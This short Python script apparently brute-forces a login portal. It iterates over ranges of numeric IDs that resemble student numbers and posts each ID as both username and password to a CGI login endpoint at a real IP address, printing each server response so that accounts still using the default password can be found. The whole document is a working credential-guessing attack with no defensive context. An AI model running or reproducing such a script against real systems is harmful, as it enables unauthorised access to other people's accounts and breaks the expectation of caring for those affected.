import requests
s = requests.session()
a = 201760501101
b = 201760501145
for j in range(0,10):
    for i in range(a,b):
        payload = {'uname': i, 'pass': i}
        url="http://202.194.116.85/cgi-bin/do_login"
        r = s.post(url,payload)
        print i,'++++++',r.text
    a = a + 1000
    b = b + 1000

a = 201758501101
b = 201758501145
for j in range(0,10):
    for i in range(a,b):
        payload = {'uname': i, 'pass': i}
        url="http://202.194.116.85/cgi-bin/do_login"
        r = s.post(url,payload)
        print i,'++++++',r.text
